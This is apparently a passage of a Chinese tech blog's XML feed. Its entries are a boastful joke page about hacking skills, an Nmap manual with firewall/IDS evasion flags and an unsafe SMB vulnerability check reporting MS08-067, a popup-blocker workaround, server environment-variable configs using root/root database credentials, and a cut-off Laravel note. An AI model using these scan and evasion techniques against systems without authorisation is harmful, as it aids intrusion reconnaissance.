              <breadCrumb title="技术文章" url="http://www.weshell.net/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/to-1-to.html</loc>
    <lastmod>2015-01-09T06:50:46.000Z</lastmod>
    <data>
        <display>
        <title>给我留言</title>
        <pubTime>2014-03-16T02:17:16.000Z</pubTime>
        
         <content><![CDATA[<div class="alert alert-danger"><i class="fa fa-bug"></i>  <p>本人学识渊博，经验丰富，代码风骚，效率恐怖。C/C++、Java、php无不精通，熟练掌握各种框架， 会DDOS一秒钟死一个站，，会注入，会上传，会Xss,会破解，会嗅探，会开发，会业务，会运维，渗透，调戏客服MM，无不精通，全面漏洞认识深刻，熟练掌握各种渗透理论，各种操作系统内核，认真学习过《黑客攻防技术宝典》《逆向工程》《游戏waigua攻防艺术》等专业书籍， 深山苦练5年，一天只睡4小时，脾气好，不喷人，操作虎，意识强，渗透快，shell多，能过狗，能过盾，听指挥， 千里之外取服务器首级，瞬息之间爆管理员，压安全狗如压草芥，电话通知出bug后，秒登vpn，千里之外定位问题，瞬息之间修复上线。祖传三代heike，电话通知后10秒钟上线，身体强壮可持续渗透7天7夜， 上千万肉鸡Ddos流量永不停歇，上至百度、谷歌、NASA、下至刷struts2，刷dedecms,什么都会玩!!! 本人身体强壮，健步如飞，可连续编程100小时不休息，讨论技术方案5小时不喝水，上至带项目、出方案，下至盗号威胁pm，什么都能干。备用电源，千兆光纤，无线网卡，永不断网，备用电脑一台，发电机二台（含柴油100升） 本人意识猥琐，技艺娴熟，0day丰富，能上各种渗透工具，怕延迟可直接接受电话指挥，语音指挥5小时不喝水.第一时间赶到众测现场，堵抢快，让漏洞，断后路， 魂斗罗一命通关，拳皇单手无限连，跑跑闭眼连漂，CS专业甩狙，扫雷12秒最高难度通关。 LOL对面20必投。</p>
</div>]]></content>
         
         
           
             
              <breadCrumb title="关于博客" url="http://www.weshell.net/categories/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/namp-help.html</loc>
    <lastmod>2015-01-09T06:44:42.000Z</lastmod>
    <data>
        <display>
        <title>Nmap使用手册</title>
        <pubTime>2015-01-04T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<h2 id="简单示例">简单示例</h2>
<p>使用ping检测10.0.0.0/24这个网段</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sP 10.0.0.0/24</div></pre></td></tr></table></figure>

<p>`</p>
<p>使用SYN扫描,在aggressive(4)的时间模板下,探测操作系统的类型和版本,还有显示traceroute的结果,结果输出较为详细</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -v-sS -A -T4 target</div></pre></td></tr></table></figure>

<p>`</p>
<p>使用SYN的方法对全端口进行扫描,在aggressive(4)的时间模板下,同时对开放的端口进行端口识别</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -p1-65535 -sV -sS -T4 target PS: -T代表的是扫描的时候,一些控制选项(TCP的延迟时间,探测报文之间的间隔等)的集合</div></pre></td></tr></table></figure>

<p>`</p>
<p>使用SYN扫描,在insane(5)的时间模板下,探测操作系统的类型和版本,还有显示traceroute的结果,结果输出较为详细</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -v-sS -A -T5 target</div></pre></td></tr></table></figure>

<p>`</p>
<p>用SYN的方法对全端口进行扫描,同时对开放的端口进行端口识别,在insane(5)的时间模板下,探测操作系统的类型,还有显示traceroute的结果,结果输出较为详细</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -v-p 1-65535 -sV -O -sS -T5 target</div></pre></td></tr></table></figure>

<p>使用SYN扫描,在insane(5)的时间模板下,探测操作系统的类型,还有显示traceroute的结果,操作系统的类型,结果输出较为详细</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -v-sV -O -sS -T5 target</div></pre></td></tr></table></figure>

<p>使用SYN的方法对全端口进行扫描,同时对开放的端口进行端口识别,在aggressive(4)的时间模板下,探测操作系统的类型还有显示traceroute的结果,结果输出较为详细</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -v-p 1-65535 -sV -O -sS -T4 target</div></pre></td></tr></table></figure>

<p>从文件中读取需要扫描的IP列表</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -iL ip-address.txt</div></pre></td></tr></table></figure>

<p>Nmap输出格式</p>
<p>扫描的结果输出到屏幕,同时会存储一份到grep-output.txt</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sV -p 139,445 -oG grep-output.txt 10.0.1.0/24</div></pre></td></tr></table></figure>

<p>扫描结果输出为html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sS -sV -T5 10.0.1.99 --webxml -oX - | xsltproc --output file.html</div></pre></td></tr></table></figure>

<p>Nmap扫描Netbios<br>在子网中发现开放netbios的IP</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sV -v-p139,445 10.0.0.1/24</div></pre></td></tr></table></figure>

<p>扫描指定netbios的名称</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sU --script nbstat.nse -p 137 target</div></pre></td></tr></table></figure>

<p>扫描指定的目标,同时检测相关漏洞</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 target</div></pre></td></tr></table></figure>

<p>将nmap的80端口的扫描结果,通过管道交给nikto进行扫描</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Nmap Nikto Scan nmap -p80 10.0.1.0/24-oG - | nikto.pl -h -</div></pre></td></tr></table></figure>

<p>将nmap的80,443端口的扫描结果,通过管道交给nikto进行扫描</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -p80,443 10.0.1.0/24-oG - | nikto.pl -h -</div></pre></td></tr></table></figure>

<h2 id="Nmap参数详解">Nmap参数详解</h2>
<p>Nmap支持主机名,ip,网段的表示方式</p>
<p>例如:blah.highon.coffee, namp.org/24, 192.168.0.1;10.0.0-25.1-254</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">-iL filename                    从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段</div><div class="line">-iR hostnum                     随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描</div><div class="line">--exclude host1[, host2]        从扫描任务中需要排除的主机          </div><div class="line">--exculdefile exclude_file      排除文件中的IP,格式和-iL指定扫描文件的格式相同</div></pre></td></tr></table></figure>

<p>主机发现</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-sL                     仅仅是显示,扫描的IP数目,不会进行任何扫描</div><div class="line">-sn                     ping扫描,即主机发现</div><div class="line">-Pn                     不检测主机存活</div><div class="line">-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCPACK Ping/UDPPing发现</div><div class="line">-PE/PP/PM使用ICMP echo, timestamp and netmask 请求包发现主机</div><div class="line">-PO[prococol list]      使用IP协议包探测对方主机是否开启  </div><div class="line">-n/-R不对IP进行域名反向解析/为所有的IP都进行域名的反响解析</div></pre></td></tr></table></figure>

<p>扫描技巧</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">-sS/sT/sA/sW/sMTCP SYN/TCPconnect()/ACK/TCP窗口扫描/TCPMaimon扫描</div><div class="line">-sU                             UDP扫描</div><div class="line">-sN/sF/sXTCP Null，FIN，and Xmas扫描</div><div class="line">--scanflags                     自定义TCP包中的flags</div><div class="line">-sI zombie host[:probeport]     Idlescan</div><div class="line">-sY/sZSCTP INIT/COOKIE-ECHO扫描</div><div class="line">-sO                             使用IP protocol 扫描确定目标机支持的协议类型</div><div class="line">-b “FTP relay host”             使用FTP bounce scan</div></pre></td></tr></table></figure>

<p>服务版本识别</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-sV                             开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测</div><div class="line">--version-intensity "level"设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7</div><div class="line">--version-light                 打开轻量级模式,为--version-intensity 2的别名</div><div class="line">--version-all                   尝试所有探测,为--version-intensity 9的别名</div><div class="line">--version-trace                 显示出详细的版本侦测过程信息</div></pre></td></tr></table></figure>

<p>指定端口和扫描顺序</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">-p                      特定的端口 -p80,443 或者 -p1-65535</div><div class="line">-p U:PORT               扫描udp的某个端口, -p U:53</div><div class="line">-F                      快速扫描模式,比默认的扫描端口还少</div><div class="line">-r                      不随机扫描端口,默认是随机扫描的</div><div class="line">--top-ports "number"扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个</div><div class="line">--port-ratio "ratio"扫描指定频率以上的端口</div></pre></td></tr></table></figure>

<p>防火墙/IDS躲避和哄骗</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">-f; --mtu value                 指定使用分片、指定数据包的MTU.</div><div class="line">-D decoy1,decoy2,ME             使用诱饵隐蔽扫描</div><div class="line">-S IP-ADDRESS                   源地址欺骗</div><div class="line">-e interface                    使用指定的接口</div><div class="line">-g/ --source-port PROTNUM       使用指定源端口  </div><div class="line">--proxies url1,[url2],...       使用HTTP或者SOCKS4的代理 </div><div class="line">--data-length NUM               填充随机数据让数据包长度达到NUM</div><div class="line">--ip-options OPTIONS            使用指定的IP选项来发送数据包</div><div class="line">--ttl VALUE                     设置IP time-to-live域</div><div class="line">--spoof-mac ADDR/PREFIX/VEBDORMAC地址伪装</div><div class="line">--badsum                        使用错误的checksum来发送数据包</div></pre></td></tr></table></figure>

<p>脚本扫描</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-sC                             根据端口识别的服务,调用默认脚本</div><div class="line">--script=”Lua scripts”          调用的脚本名</div><div class="line">--script-args=n1=v1,[n2=v2]     调用的脚本传递的参数</div><div class="line">--script-args-file=filename     使用文本传递参数</div><div class="line">--script-trace                  显示所有发送和接收到的数据</div><div class="line">--script-updatedb               更新脚本的数据库</div><div class="line">--script-help=”Lua script”      显示指定脚本的帮助</div></pre></td></tr></table></figure>

<p>OS识别</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-O              启用操作系统检测,-A来同时启用操作系统检测和版本检测</div><div class="line">--osscan-limit  针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)</div><div class="line">--osscan-guess  推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配</div></pre></td></tr></table></figure>

<p>Nmap 输出</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">-oN                     将标准输出直接写入指定的文件</div><div class="line">-oX                     输出xml文件</div><div class="line">-oS                     将所有的输出都改为大写</div><div class="line">-oG                     输出便于通过bash或者perl处理的格式,非xml</div><div class="line">-oA BASENAME            可将扫描结果以标准格式、XML格式和Grep格式一次性输出</div><div class="line">-v提高输出信息的详细度</div><div class="line">-d level                设置debug级别,最高是9</div><div class="line">--reason                显示端口处于带确认状态的原因</div><div class="line">--open只输出端口状态为open的端口</div><div class="line">--packet-trace          显示所有发送或者接收到的数据包</div><div class="line">--iflist                显示路由信息和接口,便于调试</div><div class="line">--log-errors            把日志等级为errors/warings的日志输出</div><div class="line">--append-output         追加到指定的文件</div><div class="line">--resume FILENAME       恢复已停止的扫描</div><div class="line">--stylesheet PATH/URL设置XSL样式表，转换XML输出</div><div class="line">--webxml                从namp.org得到XML的样式</div><div class="line">--no-sytlesheet         忽略XML声明的XSL样式表</div></pre></td></tr></table></figure>

<p>其他nmap选项</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">-6                      开启IPv6</div><div class="line">-A                      OS识别,版本探测,脚本扫描和traceroute</div><div class="line">--datedir DIRNAME       说明用户Nmap数据文件位置</div><div class="line">--send-eth / --send-ip  使用原以太网帧发送/在原IP层发送</div><div class="line">--privileged            假定用户具有全部权限</div><div class="line">--unprovoleged          假定用户不具有全部权限,创建原始套接字需要root权限</div><div class="line">-V                      打印版本信息</div><div class="line">-h                      输出帮助</div></pre></td></tr></table></figure>

<h2 id="例子">例子</h2>
<p>整个子网检测的Netbios</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Nmap -sV -v-p 139,445 10.0.1.0/24</div><div class="line">Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-11 21:26 GMT</div><div class="line">Nmap scan report fornas.decepticons 10.0.1.12</div><div class="line">Host is up (0.014s latency).</div><div class="line">PORT STATE SERVICE VERSION</div><div class="line">139/tcpopennetbios-ssn Samba smbd 3.X (workgroup: MEGATRON)</div><div class="line">445/tcpopennetbios-ssn Samba smbd 3.X (workgroup: MEGATRON)</div><div class="line">Service detection performed. Please report any incorrect results at http://nmap.org/submit/.</div><div class="line">Nmap done: 256 IP addresses (1 hosts up) scanned in28.74 seconds</div></pre></td></tr></table></figure>

<p>Nmap 查找Netbios名称</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">nmap -sU --script nbstat.nse -p 137 10.0.1.12</div><div class="line">Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-11 21:26 GMT</div><div class="line">Nmap scan report fornas.decepticons 10.0.1.12</div><div class="line">Host is up (0.014s latency).</div><div class="line">PORT STATE SERVICE VERSION</div><div class="line">137/udpopennetbios-ns</div><div class="line">Host script results:</div><div class="line">|_nbstat: NetBIOS name: STARSCREAM, NetBIOS user: unknown, NetBIOS MAC: unknown (unknown) </div><div class="line">Nmap done: 256 IP addresses (1 hosts up) scanned in28.74 seconds</div></pre></td></tr></table></figure>

<p>如果开启Netbios服务,检查是否存在漏洞</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 10.0.0.1</div><div class="line">Nmap scan report forie6winxp.decepticons (10.0.1.1)</div><div class="line">Host is up (0.00026s latency).</div><div class="line">PORT STATE SERVICE</div><div class="line">445/tcpopenmicrosoft-ds</div><div class="line">Host script results:</div><div class="line">| smb-check-vulns:</div><div class="line">| MS08-067: VULNERABLE</div><div class="line">| Conficker: Likely CLEAN</div><div class="line">| regsvc DoS: NOT VULNERABLE</div><div class="line">| SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE</div><div class="line">|_ MS07-029: NO SERVICE (the Dns Server RPC service is inactive)</div></pre></td></tr></table></figure>

<p>Nmap done: 1 IP address (1 host up) scanned in5.45 seconds<br>根据扫描结果,发现存在MS08-067漏洞</p>
]]></content>
         
         
           
             
              <breadCrumb title="技术文章" url="http://www.weshell.net/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/javascript-show.html</loc>
    <lastmod>2015-01-09T06:36:32.000Z</lastmod>
    <data>
        <display>
        <title>JavaScript禁止浏览器屏蔽window.open</title>
        <pubTime>2015-01-02T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<p>因为大部分浏览器都屏蔽掉了JS中的window.open，所以我们要想办法来突破阻止</p>
<p>在某些时候我们需要利用弹窗来显示一些信息，这个时候我们可以直接在JS中调用</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">window</span>.open(url,“_blank”,option);</div></pre></td></tr></table></figure>

<p>就可以完成跳转，而且还能传递我们需要的参数</p>
<p>但是有个问题是，很多浏览器不支持代码触发上述代码，这个问题在平常使用中显得很不方便，尤其是我们经常用ajax返回值来触发一个新页面。</p>
<p>为了防止被屏蔽，可以有两种方式解决。<br>1、在用户点击事件中增加监听程序</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">button</span> <span class="attribute">onclick</span>=<span class="value">“test()”</span>&gt;</span>点击<span class="tag">&lt;/<span class="title">button</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">“text</span>/<span class="attribute">javascript</span>”&gt;</span><span class="javascript"></span></div><div class="line"><span class="keyword">var</span> is_finished=<span class="literal">false</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>{</div><div class="line">$.get(“/”,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>{</div><div class="line">is_finished=<span class="literal">true</span>;</div><div class="line">});</div><div class="line">test2();</div><div class="line">}</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test2</span><span class="params">()</span></span>{</div><div class="line"><span class="keyword">if</span>(is_finished){</div><div class="line"><span class="built_in">window</span>.open(“http:<span class="comment">//www.baidu.com”,“_blank”);</span></div><div class="line">}<span class="keyword">else</span>{</div><div class="line">setTimeout(test2,<span class="number">1000</span>);</div><div class="line">}</div><div class="line">}</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<p>2、在点击后先打开空白页，之后再修改地址</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">button</span> <span class="attribute">onclick</span>=<span class="value">“test()”</span>&gt;</span>点击<span class="tag">&lt;/<span class="title">button</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">“text</span>/<span class="attribute">javascript</span>”&gt;</span><span class="javascript"></span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>{</div><div class="line"><span class="keyword">var</span> frame=<span class="built_in">window</span>.open(“about:blank”,“_blank”);</div><div class="line">$.get(“/”,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>{</div><div class="line">frame.location=“http:<span class="comment">//www.baidu.com”;</span></div><div class="line">});</div><div class="line">}</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

]]></content>
         
         
           
             
              <breadCrumb title="技术文章" url="http://www.weshell.net/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/php-for-var.html</loc>
    <lastmod>2015-01-09T06:06:52.000Z</lastmod>
    <data>
        <display>
        <title>PHP设置服务器Apache/Nginx环境变量</title>
        <pubTime>2015-01-04T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<h2 id="设置Apache环境变量">设置Apache环境变量</h2>
<h3 id="指令">指令</h3>
<p>设置当前环境变量为DEV</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SetEnv RUNTIME_ENVIROMENT DEV</div></pre></td></tr></table></figure>

<p>数据库帐号密码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SetEnv MYSQL_USERNAME root</div><div class="line">SetEnv MYSQL_PASSWORD root</div></pre></td></tr></table></figure>

<p>配置文件格式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;VirtualHost *:<span class="number">80</span>&gt;</div><div class="line">    ServerAdmin admin@admin.com</div><div class="line">    DocumentRoot <span class="string">"/var/www/"</span></div><div class="line">    ServerName localhost</div><div class="line">    SetEnv RUNTIME_ENVIROMENT DEV</div><div class="line">    SetEnv MYSQL_USERNAME root</div><div class="line">    SetEnv MYSQL_PASSWORD root</div><div class="line">    ErrorLog <span class="string">"logs/error.log"</span></div><div class="line">    CustomLog <span class="string">"logs/access.log"</span> common</div><div class="line">&lt;/VirtualHost&gt;</div></pre></td></tr></table></figure>

<h2 id="设置Nginx环境变量">设置Nginx环境变量</h2>
<h3 id="指令-1">指令</h3>
<p>设置当前环境变量为DEV</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fastcgi_param RUNTIME_ENVIROMENT <span class="string">'DEV'</span></div></pre></td></tr></table></figure>

<p>数据库帐号密码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fastcgi_param MYSQL_USERNAME <span class="string">'root'</span></div><div class="line">fastcgi_param MYSQL_PASSWORD <span class="string">'root'</span></div></pre></td></tr></table></figure>

<h3 id="配置文件格式">配置文件格式</h3>
<p>在fastcgi_params文件中配置</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">fastcgi_param RUNTIME_ENVIROMENT <span class="string">'DEV'</span>;</div><div class="line">fastcgi_param MYSQL_USERNAME <span class="string">'root'</span>;</div><div class="line">fastcgi_param MYSQL_PASSWORD <span class="string">'root'</span>;</div></pre></td></tr></table></figure>

<h3 id="在nginx-conf中配置">在nginx.conf中配置</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">server {</div><div class="line">    listen   <span class="number">80</span>; </div><div class="line">    root /<span class="keyword">var</span>/www;</div><div class="line">    index index.php;</div><div class="line">    server_name localhost;</div><div class="line">    location /</div><div class="line">    {   </div><div class="line">         index index.php;</div><div class="line">    }   </div><div class="line">      </div><div class="line">    location ~ .*\.(php|php5)?$ {</div><div class="line">        fastcgi_pass <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9000</span>;</div><div class="line">        fastcgi_index index.php;</div><div class="line">        <span class="keyword">include</span> fastcgi_params;</div><div class="line">    }   </div><div class="line">}</div></pre></td></tr></table></figure>

<h2 id="为PHP脚本设置环境变量">为PHP脚本设置环境变量</h2>
<h3 id="为当前用户临时设置">为当前用户临时设置</h3>
<p>临时设置只需要执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export KEY=VALUE</div></pre></td></tr></table></figure>

<h3 id="为当前用户永久设置">为当前用户永久设置</h3>
<p>在~/.bashrc（不同系统各有不同）中写</p>
<h3 id="为所有用户不包括root设置">为所有用户不包括root设置</h3>
<p>创建文件/etc/profile.d/test.sh，写入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">KEY=VALUE</div></pre></td></tr></table></figure>

<h3 id="为所有用户包括root设置">为所有用户包括root设置</h3>
<p>在/etc/environment中写入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">KEY=VALUE</div></pre></td></tr></table></figure>

<p>php<br>注意，这个文件的生效时间是用户登录时，所以对于root来说，需要重启机器</p>
<h3 id="在Supervisor中设置">在Supervisor中设置</h3>
<p>有的时候PHP脚本是用Supervisor来控制的，所以记得设置supervisor配置中的environment项</p>
<h2 id="PHP中调用服务器环境变量">PHP中调用服务器环境变量</h2>
<p>在PHP中有两个调用方式：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$env</span> = getenv(<span class="string">'RUNTIME_ENVIROMENT'</span>);</div><div class="line">还有超全局变量方式：</div><div class="line"></div><div class="line"><span class="variable">$env</span> = <span class="variable">$_SERVER</span>[<span class="string">'RUNTIME_ENVIROMENT'</span>];</div></pre></td></tr></table></figure>

]]></content>
         
         
           
             
              <breadCrumb title="技术文章" url="http://www.weshell.net/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/laravel-chace.html</loc>
    <lastmod>2015-01-09T05:53:20.000Z</lastmod>
    <data>
        <display>
        <title>Laravel关联模型由于名称一致性导致的BUG问题</title>
        <pubTime>2015-01-04T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<h2 id="容易犯错的位置">容易犯错的位置</h2>
<p>最容易犯错的代码是这样的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MyPost::with(‘myPostInfo’)-&gt;get();</div></pre></td></tr></table></figure>

<p>在使用With去eagerLoad关联模型时，必须使用和定义方法同名的key去读取，那么这样读取出来的方法只能是Camel Case的key。其他地方就只能用</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$my_post-&gt;myPostInfo;</div></pre></td></tr></table></figure>

<p>来保证不出问题。</p>
<h2 id="toArray()_方法失效">toArray() 方法失效</h2>
<p>如果同时使用了两者，另外一个问题就是导致Model::toArray()失效。因为toArray()方法首先去relations中查找Snake Case命名的关联模型，没有的话才去看Camel Case的。<br>所以如果用到了toArray()方法来转换Model，切忌同时使用两者。</p>
<h2 id="定义关联模型">定义关联模型</h2>
<p>在Laravel里面，我们可以通过定义以下Model来完成关联查询。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">class MyPost extends Eloquent {</div><div class="line">    public function myPostInfo () {</div><div class="line">        return $this-&gt;hasOne('MyPostInfo');</div><div class="line">    }</div><div class="line">}</div><div class="line">class MyPostInfo extends Eloquent {}</div></pre></td></tr></table></figure>

<h2 id="使用关联模型">使用关联模型</h2>
